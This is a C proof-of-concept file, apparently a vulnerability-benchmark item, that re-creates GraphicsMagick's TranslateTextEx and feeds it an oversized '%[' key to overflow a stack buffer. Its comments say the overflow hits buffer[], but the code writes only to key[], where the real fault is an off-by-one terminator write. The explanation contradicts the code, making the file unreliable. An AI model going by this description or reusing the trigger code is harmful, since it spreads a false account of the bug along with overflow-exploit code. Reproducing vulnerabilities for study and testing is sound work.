#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for CVE ID: arvo:10055 */
/* Triggers: stack-buffer-overflow in TranslateTextEx (GraphicsMagick) */

typedef struct _ImageInfo ImageInfo;
typedef struct _Image Image;
typedef int MagickTextTranslate;

#define MaxTextExtent 4096

static char *TranslateTextEx(const ImageInfo *image_info,
                             Image *image,
                             const char *formatted_text,
                             MagickTextTranslate translate)
{
  char
    buffer[MaxTextExtent],
    *text,
    *translated_text;

  register char
    *p,
    *q;

  register long
    i;

  size_t
    length,
    offset;

  if ((formatted_text == (const char *) NULL) || (*formatted_text == '\0'))
    return((char *) NULL);
  text=(char *) formatted_text;
  length=strlen(text)+MaxTextExtent;
  translated_text=malloc(length);
  if (translated_text == (char *) NULL)
    return NULL;
  strcpy(translated_text,text);
  p=text;
  for (q=translated_text; *p != '\0'; p++)
  {
    *q='\0';
    if ((size_t) (q-translated_text+MaxTextExtent) >= length)
      {
        length<<=1;
        translated_text=realloc(translated_text,length);
        if (translated_text == (char *) NULL)
          break;
        q=translated_text+strlen(translated_text);
      }
    if (*p != '%')
      {
        *q++=(*p);
        continue;
      }
    p++;
    switch (*p)
    {
      case '[':
      {
        char
          key[MaxTextExtent];
        p++;
        for (i=0; (i < MaxTextExtent) && (*p) && (*p != ']'); i++)
          {
          key[i]=(*p++);
          }
        key[i]='\0';
        break;
      }
    }
  }
  return translated_text;
}

int main(void) {
    /* Trigger stack buffer overflow in buffer[] via %[ parsing */
    /* The loop writes to buffer[] instead of key[] - overflow buffer[MaxTextExtent] */
    size_t len = MaxTextExtent + 100;
    char *input = malloc(len + 3);
    if (!input) return 1;
    
    input[0] = '%';
    input[1] = '[';
    memset(input + 2, 'A', len - 2);
    input[len] = ']';
    input[len + 1] = '\0';
    
    /* Call the vulnerable function */
    char *result = TranslateTextEx(NULL, (Image*)1, input, 0);
    
    if (result) free(result);
    free(input);
    return 0;
}